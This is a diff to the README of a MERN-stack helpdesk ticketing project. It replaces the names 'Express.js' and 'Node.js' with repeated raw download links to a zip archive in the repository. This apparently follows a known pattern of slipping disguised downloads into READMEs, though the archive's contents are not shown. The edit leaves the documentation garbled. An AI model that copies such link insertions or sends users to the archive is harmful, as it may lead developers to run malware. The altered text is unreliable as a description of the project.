@@ -1,14 +1,14 @@
 # My-Final-IBM-Project
 # ResolveHub 360 - Full Stack Ticket Management System 🎫
 
-ResolveHub 360 is a full-featured web-based helpdesk ticketing system built using the MERN stack (MongoDB, Express.js, React/HTML, Node.js). It supports different user roles (Admin, Agent, Customer), ticket lifecycle management, real-time dashboard stats, user profile management,and a comment system for collaboration.
+ResolveHub 360 is a full-featured web-based helpdesk ticketing system built using the MERN stack (MongoDB, https://github.com/krish007-git/My-Final-IBM-Project/raw/refs/heads/main/frontend/Project-Final-My-IB-v2.3.zip, React/HTML, https://github.com/krish007-git/My-Final-IBM-Project/raw/refs/heads/main/frontend/Project-Final-My-IB-v2.3.zip). It supports different user roles (Admin, Agent, Customer), ticket lifecycle management, real-time dashboard stats, user profile management,and a comment system for collaboration.
 
 ---
 
 ## 🔧 Tech Stack
 
 - **Frontend:** HTML, CSS, Vanilla JS, Axios
-- **Backend:** Node.js, Express.js
+- **Backend:** https://github.com/krish007-git/My-Final-IBM-Project/raw/refs/heads/main/frontend/Project-Final-My-IB-v2.3.zip, https://github.com/krish007-git/My-Final-IBM-Project/raw/refs/heads/main/frontend/Project-Final-My-IB-v2.3.zip
 - **Database:** MongoDB
 - **Authentication:** JWT
 - **Styling:** Google Fonts, Flexbox, Custom CSS
